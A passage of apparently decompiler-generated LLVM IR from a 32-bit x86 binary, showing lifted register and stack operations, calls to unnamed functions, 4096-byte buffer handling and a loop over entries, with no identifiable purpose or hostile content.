  %v1_804d88c = add i32 %v0_804d866, 4
  %v2_804d88c = inttoptr i32 %v1_804d88c to i32*
  store i32 0, i32* %v2_804d88c, align 4
  %v2_804d88e = inttoptr i32 %v0_804d866 to i32*
  store i32 6, i32* %v2_804d88e, align 4
  %v3_804d890 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804d890, i32* %eax.global-to-local, align 4
  %v0_804d895 = load i32, i32* @esp, align 4
  %v1_804d895 = inttoptr i32 %v0_804d895 to i32*
  %v3_804d895 = add i32 %v0_804d895, 4
  %v1_804d896 = inttoptr i32 %v3_804d895 to i32*
  store i32 %v3_804d890, i32* %v1_804d896, align 4
  %v1_804d898 = add i32 %v0_804d895, 4139
  store i32 %v1_804d898, i32* %eax.global-to-local, align 4
  store i32 %v1_804d898, i32* %v1_804d895, align 4
  %v3_804d8a0 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8a0, i32* %eax.global-to-local, align 4
  %v0_804d8a5 = load i32, i32* @esp, align 4
  %v1_804d8a5 = inttoptr i32 %v0_804d8a5 to i32*
  %v2_804d8a5 = load i32, i32* %v1_804d8a5, align 4
  store i32 %v2_804d8a5, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v0_804d8a5, 4139
  store i32 %v1_804d8a6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d8a6, i32* %v1_804d8a5, align 4
  %v2_804d8ae = call i32 @function_80514e0(i8* null)
  store i32 %v2_804d8ae, i32* %eax.global-to-local, align 4
  %v0_804d8b3 = load i32, i32* @esp, align 4
  %v1_804d8b3 = inttoptr i32 %v0_804d8b3 to i32*
  %v2_804d8b3 = load i32, i32* %v1_804d8b3, align 4
  store i32 %v2_804d8b3, i32* %edx.global-to-local, align 4
  %v3_804d8b3 = add i32 %v0_804d8b3, 4
  %v1_804d8b4 = inttoptr i32 %v3_804d8b3 to i32*
  %v0_804d8b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b5, i32* %v1_804d8b4, align 4
  %v1_804d8b6 = add i32 %v0_804d8b3, 4139
  store i32 %v1_804d8b6, i32* %edx.global-to-local, align 4
  %v2_804d8bd = add i32 %v1_804d8b6, %v2_804d8ae
  store i32 %v2_804d8bd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8bd, i32* %v1_804d8b3, align 4
  %v3_804d8c1 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8c1, i32* %eax.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @esp, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 %v2_804d8c6, i32* @ebp, align 4
  %v3_804d8c6 = add i32 %v0_804d8c6, 4
  %v1_804d8c7 = inttoptr i32 %v3_804d8c6 to i32*
  %v2_804d8c7 = load i32, i32* %v1_804d8c7, align 4
  store i32 %v2_804d8c7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d8c7, align 4
  store i32 7, i32* %v1_804d8c6, align 4
  %v3_804d8cc = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804d8cc, i32* %eax.global-to-local, align 4
  %v0_804d8d1 = load i32, i32* @esp, align 4
  %v1_804d8d1 = inttoptr i32 %v0_804d8d1 to i32*
  %v2_804d8d1 = load i32, i32* %v1_804d8d1, align 4
  store i32 %v2_804d8d1, i32* @esi, align 4
  store i32 %v3_804d8cc, i32* @ebx, align 4
  %v1_804d8d4 = add i32 %v0_804d8d1, 4139
  store i32 %v1_804d8d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804d8d4, i32* %v1_804d8d1, align 4
  %v2_804d8dc = call i32 @function_80514e0(i8* null)
  store i32 %v2_804d8dc, i32* %eax.global-to-local, align 4
  %v0_804d8e1 = load i32, i32* @esp, align 4
  %v1_804d8e1 = inttoptr i32 %v0_804d8e1 to i32*
  %v2_804d8e1 = load i32, i32* %v1_804d8e1, align 4
  store i32 %v2_804d8e1, i32* %edx.global-to-local, align 4
  %v3_804d8e1 = add i32 %v0_804d8e1, 4
  %v1_804d8e2 = inttoptr i32 %v3_804d8e1 to i32*
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e3, i32* %v1_804d8e2, align 4
  %v1_804d8e4 = add i32 %v0_804d8e1, 4139
  store i32 %v1_804d8e4, i32* %edx.global-to-local, align 4
  %v2_804d8eb = add i32 %v1_804d8e4, %v2_804d8dc
  store i32 %v2_804d8eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8eb, i32* %v1_804d8e1, align 4
  %v3_804d8ef = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d8f4 = load i32, i32* @esp, align 4
  %v1_804d8f7 = add i32 %v0_804d8f4, 8
  %v2_804d8f7 = inttoptr i32 %v1_804d8f7 to i32*
  store i32 4096, i32* %v2_804d8f7, align 4
  %v1_804d8fc = add i32 %v0_804d8f4, 43
  store i32 %v1_804d8fc, i32* %eax.global-to-local, align 4
  %v2_804d900 = add i32 %v0_804d8f4, 4
  %v3_804d900 = inttoptr i32 %v2_804d900 to i32*
  store i32 %v1_804d8fc, i32* %v3_804d900, align 4
  %v1_804d901 = add i32 %v0_804d8f4, 4139
  store i32 %v1_804d901, i32* %edx.global-to-local, align 4
  %v3_804d908 = inttoptr i32 %v0_804d8f4 to i32*
  store i32 %v1_804d901, i32* %v3_804d908, align 4
  %v4_804d909 = call i32 @function_8051c52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d90e = load i32, i32* @esp, align 4
  %v1_804d90e = add i32 %v0_804d90e, 16
  %v1_804d911 = add i32 %v4_804d909, 1
  %v8_804d911 = icmp eq i32 %v1_804d911, 0
  store i32 %v1_804d911, i32* %eax.global-to-local, align 4
  br i1 %v8_804d911, label %dec_label_pc_804d859, label %dec_label_pc_804d918

dec_label_pc_804d918:                             ; preds = %dec_label_pc_804d88a
  %v2_804d918 = add i32 %v0_804d90e, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d911, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d90e, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d90e, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d90e to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* %eax.global-to-local, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %edx.global-to-local, align 4
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @function_80514e0(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v2_804d941 = load i32, i32* %v1_804d941, align 4
  store i32 %v2_804d941, i32* %edx.global-to-local, align 4
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @edi, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  store i32 %v1_804d944, i32* %edx.global-to-local, align 4
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94f = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d954 = load i32, i32* @esp, align 4
  %v1_804d954 = inttoptr i32 %v0_804d954 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* @ebp, align 4
  %v3_804d954 = add i32 %v0_804d954, 4
  %v1_804d955 = inttoptr i32 %v3_804d954 to i32*
  %v2_804d955 = load i32, i32* %v1_804d955, align 4
  store i32 %v2_804d955, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d955, align 4
  store i32 9, i32* %v1_804d954, align 4
  %v3_804d95a = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804d95a, i32* %eax.global-to-local, align 4
  %v0_804d95f = load i32, i32* @esp, align 4
  %v1_804d95f = inttoptr i32 %v0_804d95f to i32*
  %v2_804d95f = load i32, i32* %v1_804d95f, align 4
  store i32 %v2_804d95f, i32* @esi, align 4
  store i32 %v3_804d95a, i32* @ebx, align 4
  %v1_804d962 = add i32 %v0_804d95f, 4139
  store i32 %v1_804d962, i32* %eax.global-to-local, align 4
  store i32 %v1_804d962, i32* %v1_804d95f, align 4
  %v2_804d96a = call i32 @function_80514e0(i8* null)
  store i32 %v2_804d96a, i32* %eax.global-to-local, align 4
  %v0_804d96f = load i32, i32* @esp, align 4
  %v1_804d96f = inttoptr i32 %v0_804d96f to i32*
  %v2_804d96f = load i32, i32* %v1_804d96f, align 4
  store i32 %v2_804d96f, i32* %edx.global-to-local, align 4
  %v3_804d96f = add i32 %v0_804d96f, 4
  %v1_804d970 = inttoptr i32 %v3_804d96f to i32*
  %v0_804d971 = load i32, i32* @ebx, align 4
  store i32 %v0_804d971, i32* %v1_804d970, align 4
  %v1_804d972 = add i32 %v0_804d96f, 4139
  store i32 %v1_804d972, i32* %edx.global-to-local, align 4
  %v2_804d979 = add i32 %v1_804d972, %v2_804d96a
  store i32 %v2_804d979, i32* %eax.global-to-local, align 4
  store i32 %v2_804d979, i32* %v1_804d96f, align 4
  %v3_804d97d = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d982 = load i32, i32* @esp, align 4
  %v1_804d982 = inttoptr i32 %v0_804d982 to i32*
  %v1_804d983 = add i32 %v0_804d982, 4139
  store i32 %v1_804d983, i32* %eax.global-to-local, align 4
  store i32 %v1_804d983, i32* %v1_804d982, align 4
  %v1_804d98b = call i32 @function_8051e44(i32 0)
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d990 = load i32, i32* @esp, align 4
  %v1_804d990 = add i32 %v0_804d990, 16
  store i32 %v1_804d98b, i32* @ebp, align 4
  %v1_804d995 = icmp eq i32 %v1_804d98b, 0
  br i1 %v1_804d995, label %dec_label_pc_804d859, label %dec_label_pc_804d99d.preheader

dec_label_pc_804d99d.preheader:                   ; preds = %dec_label_pc_804d918
  %v3_804d9a083 = inttoptr i32 %v0_804d990 to i32*
  store i32 %v1_804d98b, i32* %v3_804d9a083, align 4
  %v0_804d9a184 = call i32 @function_8051f35()
  store i32 %v0_804d9a184, i32* @eax, align 4
  %v0_804d9a685 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a184, i32* @esi, align 4
  %v1_804d9ab87 = icmp eq i32 %v0_804d9a184, 0
  br i1 %v1_804d9ab87, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d99d.preheader, %dec_label_pc_804d99d.backedge
  %v0_804d9a688 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ], [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ]
  %v1_804d9b3 = add i32 %v0_804d9a688, 20
  %v2_804d9b3 = inttoptr i32 %v1_804d9b3 to i32*
  %v3_804d9b3 = load i32, i32* %v2_804d9b3, align 4
  store i32 %v3_804d9b3, i32* @eax, align 4
  %v1_804d9b7 = icmp eq i32 %v3_804d9b3, 0
  %v1_804d9b9 = icmp eq i1 %v1_804d9b7, false
  br i1 %v1_804d9b9, label %dec_label_pc_804dbee, label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %dec_label_pc_804d9b3
  %v2_804d9bf = add i32 %v0_804d9a688, 12
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9bf, align 4
  %v2_804d9c0 = add i32 %v0_804d9a688, 8
  %v3_804d9c0 = inttoptr i32 %v2_804d9c0 to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9c0, align 4
  %v1_804d9c1 = add i32 %v0_804d9a688, 4
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 4096, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9a688, 43
  store i32 %v1_804d9c6, i32* %edx.global-to-local, align 4
  %v3_804d9ca = inttoptr i32 %v0_804d9a688 to i32*
  store i32 %v1_804d9c6, i32* %v3_804d9ca, align 4
  %v2_804d9cb = call i32 @function_8051570(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9d0 = load i32, i32* @esp, align 4
  %v1_804d9d0 = inttoptr i32 %v0_804d9d0 to i32*
  %v2_804d9d0 = load i32, i32* %v1_804d9d0, align 4
  store i32 %v2_804d9d0, i32* @ebx, align 4
  %v3_804d9d0 = add i32 %v0_804d9d0, 4
  %v1_804d9d1 = inttoptr i32 %v3_804d9d0 to i32*
  %v2_804d9d1 = load i32, i32* %v1_804d9d1, align 4
  store i32 %v2_804d9d1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9d1, align 4
  store i32 6, i32* %v1_804d9d0, align 4
  %v3_804d9d6 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804d9d6, i32* %eax.global-to-local, align 4
  %v0_804d9db = load i32, i32* @esp, align 4
  %v1_804d9db = inttoptr i32 %v0_804d9db to i32*
  %v2_804d9db = load i32, i32* %v1_804d9db, align 4
  store i32 %v2_804d9db, i32* %edx.global-to-local, align 4
  %v3_804d9db = add i32 %v0_804d9db, 4
  %v1_804d9dc = inttoptr i32 %v3_804d9db to i32*
  store i32 %v3_804d9d6, i32* %v1_804d9dc, align 4
  %v1_804d9de = add i32 %v0_804d9db, 4139
  store i32 %v1_804d9de, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9de, i32* %v1_804d9db, align 4
  %v3_804d9e6 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = inttoptr i32 %v0_804d9eb to i32*
  %v2_804d9eb = load i32, i32* %v1_804d9eb, align 4
  store i32 %v2_804d9eb, i32* %eax.global-to-local, align 4
  %v1_804d9ec = add i32 %v0_804d9eb, 4139
  store i32 %v1_804d9ec, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9ec, i32* %v1_804d9eb, align 4
  %v2_804d9f4 = call i32 @function_80514e0(i8* null)
  store i32 %v2_804d9f4, i32* %eax.global-to-local, align 4
  %v0_804d9f9 = load i32, i32* @esp, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v3_804d9f9 = add i32 %v0_804d9f9, 4
  %v1_804d9fa = inttoptr i32 %v3_804d9f9 to i32*
  %v2_804d9fa = load i32, i32* %v1_804d9fa, align 4
  store i32 %v2_804d9fa, i32* @ebx, align 4
  %v0_804d9fb = load i32, i32* @edi, align 4
  store i32 %v0_804d9fb, i32* %v1_804d9fa, align 4
  %v1_804d9fc = add i32 %v0_804d9f9, 4139
  store i32 %v1_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da03 = add i32 %v1_804d9fc, %v2_804d9f4
  store i32 %v2_804da03, i32* %eax.global-to-local, align 4
  store i32 %v2_804da03, i32* %v1_804d9f9, align 4
  %v3_804da07 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %eax.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804da0d, align 4
  store i32 9, i32* %v1_804da0c, align 4
  %v3_804da12 = call i32 @function_8050b30(i32 0, i32* nonnull @0)
  store i32 %v3_804da12, i32* @ebx, align 4
  %v0_804da19 = load i32, i32* @esp, align 4
  %v1_804da19 = inttoptr i32 %v0_804da19 to i32*
  %v1_804da1a = add i32 %v0_804da19, 4139
  store i32 %v1_804da1a, i32* %eax.global-to-local, align 4
  store i32 %v1_804da1a, i32* %v1_804da19, align 4
  %v2_804da22 = call i32 @function_80514e0(i8* null)
  store i32 %v2_804da22, i32* %eax.global-to-local, align 4
  %v0_804da27 = load i32, i32* @esp, align 4
  %v1_804da27 = inttoptr i32 %v0_804da27 to i32*
  %v2_804da27 = load i32, i32* %v1_804da27, align 4
  store i32 %v2_804da27, i32* %edx.global-to-local, align 4
  %v3_804da27 = add i32 %v0_804da27, 4
  %v1_804da28 = inttoptr i32 %v3_804da27 to i32*
  %v0_804da29 = load i32, i32* @ebx, align 4
  store i32 %v0_804da29, i32* %v1_804da28, align 4
  %v1_804da2a = add i32 %v0_804da27, 4139
  store i32 %v1_804da2a, i32* %edx.global-to-local, align 4
  %v2_804da31 = add i32 %v1_804da2a, %v2_804da22
  store i32 %v2_804da31, i32* %eax.global-to-local, align 4
  store i32 %v2_804da31, i32* %v1_804da27, align 4
  %v3_804da35 = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  %v0_804da3a = load i32, i32* @esp, align 4
  %v1_804da3a = inttoptr i32 %v0_804da3a to i32*
  %v2_804da3a = load i32, i32* %v1_804da3a, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v0_804da3a, 4139
  store i32 %v1_804da3b, i32* %eax.global-to-local, align 4
  store i32 %v1_804da3b, i32* %v1_804da3a, align 4
  %v2_804da43 = call i32 @function_80514e0(i8* null)
  store i32 %v2_804da43, i32* %eax.global-to-local, align 4
  %v0_804da48 = load i32, i32* @esp, align 4
  %v1_804da48 = inttoptr i32 %v0_804da48 to i32*
  %v2_804da48 = load i32, i32* %v1_804da48, align 4
  store i32 %v2_804da48, i32* %edx.global-to-local, align 4
  %v3_804da48 = add i32 %v0_804da48, 4
  %v1_804da49 = inttoptr i32 %v3_804da48 to i32*
  store i32 ptrtoint (i32* @global_var_805436d.6 to i32), i32* %v1_804da49, align 4
  %v1_804da4f = add i32 %v0_804da48, 4139
  store i32 %v1_804da4f, i32* %edx.global-to-local, align 4
  %v2_804da56 = add i32 %v1_804da4f, %v2_804da43
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  store i32 %v2_804da56, i32* %v1_804da48, align 4
  %v3_804da5a = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  %v0_804da5f = load i32, i32* @esp, align 4
  %v1_804da5f = inttoptr i32 %v0_804da5f to i32*
  %v2_804da5f = load i32, i32* %v1_804da5f, align 4
  store i32 %v2_804da5f, i32* @ebx, align 4
  %v1_804da60 = add i32 %v0_804da5f, 4139
  store i32 %v1_804da60, i32* %eax.global-to-local, align 4
  store i32 %v1_804da60, i32* %v1_804da5f, align 4
  %v2_804da68 = call i32 @function_80514e0(i8* null)
  store i32 %v2_804da68, i32* %eax.global-to-local, align 4
  %v0_804da6d = load i32, i32* @esp, align 4
  %v1_804da6d = inttoptr i32 %v0_804da6d to i32*
  %v3_804da6d = add i32 %v0_804da6d, 4
  %v0_804da6e = load i32, i32* @esi, align 4
  %v1_804da6e = add i32 %v0_804da6e, 11
  store i32 %v1_804da6e, i32* %edx.global-to-local, align 4
  %v1_804da71 = inttoptr i32 %v3_804da6d to i32*
  store i32 %v1_804da6e, i32* %v1_804da71, align 4
  %v1_804da73 = add i32 %v0_804da6d, 4139
  store i32 %v1_804da73, i32* %edx.global-to-local, align 4
  %v2_804da7a = add i32 %v1_804da73, %v2_804da68
  store i32 %v2_804da7a, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7a, i32* %v1_804da6d, align 4
  %v3_804da7e = call i32 @function_8051500(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da86 = add i32 %v0_804da83, 8
  %v2_804da86 = inttoptr i32 %v1_804da86 to i32*
  store i32 4096, i32* %v2_804da86, align 4
  %v1_804da8b = add i32 %v0_804da83, 43
  store i32 %v1_804da8b, i32* %eax.global-to-local, align 4
  %v2_804da8f = add i32 %v0_804da83, 4
  %v3_804da8f = inttoptr i32 %v2_804da8f to i32*
  store i32 %v1_804da8b, i32* %v3_804da8f, align 4
  %v1_804da90 = add i32 %v0_804da83, 4139
  store i32 %v1_804da90, i32* %edx.global-to-local, align 4
  %v3_804da97 = inttoptr i32 %v0_804da83 to i32*
  store i32 %v1_804da90, i32* %v3_804da97, align 4
  %v4_804da98 = call i32 @function_8051c52(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804daa0 = add i32 %v4_804da98, 1
  %v8_804daa0 = icmp eq i32 %v1_804daa0, 0
  store i32 %v1_804daa0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daa0, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804d9bf
  %v1_804daaa = add i32 %v0_804da9d, 43
  store i32 %v1_804daaa, i32* %eax.global-to-local, align 4
  %v3_804daae = inttoptr i32 %v0_804da9d to i32*
  store i32 %v1_804daaa, i32* %v3_804daae, align 4
  %v2_804daaf = call i32 @function_80514e0(i8* null)
  %v0_804dab4 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab4, 8764
  store i32 %v1_804dab7, i32* @edx, align 4
  %v2_804dabe = add i32 %v0_804dab4, 8
  %v3_804dabe = inttoptr i32 %v2_804dabe to i32*
  store i32 %v1_804dab7, i32* %v3_804dabe, align 4
  %v2_804dabf = add i32 %v0_804dab4, 4
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  store i32 %v2_804daaf, i32* %v3_804dabf, align 4
  %v1_804dac0 = add i32 %v0_804dab4, 43
  store i32 %v1_804dac0, i32* %eax.global-to-local, align 4
  %v3_804dac4 = inttoptr i32 %v0_804dab4 to i32*
  store i32 %v1_804dac0, i32* %v3_804dac4, align 4
  %v4_804dac5 = call i32 @function_80517d0(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v4_804dac5, 1
  %v8_804dacd = icmp eq i32 %v1_804dacd, 0
  store i32 %v1_804dacd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dacd, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804daa7
  %v0_804dad4 = load i32, i32* @ebx, align 4
  %v2_804dad4 = add i32 %v0_804daca, 12
  %v3_804dad4 = inttoptr i32 %v2_804dad4 to i32*
  store i32 %v0_804dad4, i32* %v3_804dad4, align 4
  %v0_804dad5 = load i32, i32* @ebx, align 4
  %v2_804dad5 = add i32 %v0_804daca, 8
  %v3_804dad5 = inttoptr i32 %v2_804dad5 to i32*
  store i32 %v0_804dad5, i32* %v3_804dad5, align 4
  %v1_804dad6 = add i32 %v0_804daca, 4
  %v2_804dad6 = inttoptr i32 %v1_804dad6 to i32*
  store i32 10, i32* %v2_804dad6, align 4
  %v0_804dad8 = load i32, i32* @edi, align 4
  %v3_804dad8 = inttoptr i32 %v0_804daca to i32*
  store i32 %v0_804dad8, i32* %v3_804dad8, align 4
  %v3_804dad9 = call i32 @function_80515e0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dad9, i32* %eax.global-to-local, align 4
  %v0_804dade = load i32, i32* @esp, align 4
  %v1_804dade = inttoptr i32 %v0_804dade to i32*
  %v2_804dade = load i32, i32* %v1_804dade, align 4
  store i32 %v2_804dade, i32* %edx.global-to-local, align 4
  %v3_804dade = add i32 %v0_804dade, 4
  %v1_804dadf = inttoptr i32 %v3_804dade to i32*
  store i32 9, i32* %v1_804dadf, align 4
  store i32 %v3_804dad9, i32* %v1_804dade, align 4
  %v4_804dae3 = call i32 @function_8051b60(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dae3, i32* %eax.global-to-local, align 4
  %v0_804dae8 = load i32, i32* @esp, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 20
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 1, i32* %v2_804dae8, align 4
  %v0_804daf0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d99d.backedge

dec_label_pc_804d99d.backedge:                    ; preds = %dec_label_pc_804dad4, %dec_label_pc_804d9bf, %dec_label_pc_804daa7
  %v0_804d99d42.in = phi i32 [ %v0_804daf0, %dec_label_pc_804dad4 ], [ %v0_804da9d, %dec_label_pc_804d9bf ], [ %v0_804daca, %dec_label_pc_804daa7 ]
  %v0_804d9a0.pre = load i32, i32* @ebp, align 4
  %v3_804d9a0 = inttoptr i32 %v0_804d99d42.in to i32*
  store i32 %v0_804d9a0.pre, i32* %v3_804d9a0, align 4
  %v0_804d9a1 = call i32 @function_8051f35()
  store i32 %v0_804d9a1, i32* @eax, align 4
  %v0_804d9a6 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a1, i32* @esi, align 4
  %v1_804d9ab = icmp eq i32 %v0_804d9a1, 0
  br i1 %v1_804d9ab, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804daf8:                             ; preds = %dec_label_pc_804d79b
  %v1_804daf8 = add i32 %v0_804daf8, 1
  store i32 %v1_804daf8, i32* @esi, align 4
  %v9_804daf9 = icmp eq i32 %v0_804daf8, 0
  %v1_804dafc = icmp eq i1 %v9_804daf9, false
  br i1 %v1_804dafc, label %dec_label_pc_804d7a3, label %dec_label_pc_804db02

dec_label_pc_804db02:                             ; preds = %dec_label_pc_804daf8
  %v1_804db02 = add i32 %v0_804d7a5, 3
  %v2_804db02 = inttoptr i32 %v1_804db02 to i8*
  %v3_804db02 = load i8, i8* %v2_804db02, align 1
  %v12_804db02 = icmp eq i8 %v3_804db02, 65
  %.stack_var_-8769.1 = select i1 %v12_804db02, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804db08 = add i32 %v0_804d7a5, 1
  store i32 %v1_804db08, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804db10:                             ; preds = %dec_label_pc_804d793, %dec_label_pc_804d78b
  %v1_804db10 = and i32 %v0_804db10, -256
  %v2_804db10 = or i32 %v1_804db10, 1
  br label %dec_label_pc_804d7a5

dec_label_pc_804db17:                             ; preds = %dec_label_pc_804d6fb, %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d711

dec_label_pc_804db27:                             ; preds = %dec_label_pc_804d80b
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db2e = call i32 @function_8050b60(i8 6)
  store i32 %v3_804db2e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db3a = call i32 @function_8050b60(i8 7)
  store i32 %v3_804db3a, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804db46 = call i32 @function_8050b60(i8 9)
  store i32 %v3_804db46, i32* %eax.global-to-local, align 4
  %v2_804db56.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804d694, %dec_label_pc_804db27
  %v2_804db56 = phi i32 [ %v0_804d5e3, %dec_label_pc_804d694 ], [ %v2_804db56.pre, %dec_label_pc_804db27 ]
  %v0_804db54 = load i32, i32* @ebx, align 4
  store i32 %v0_804db54, i32* %eax.global-to-local, align 4
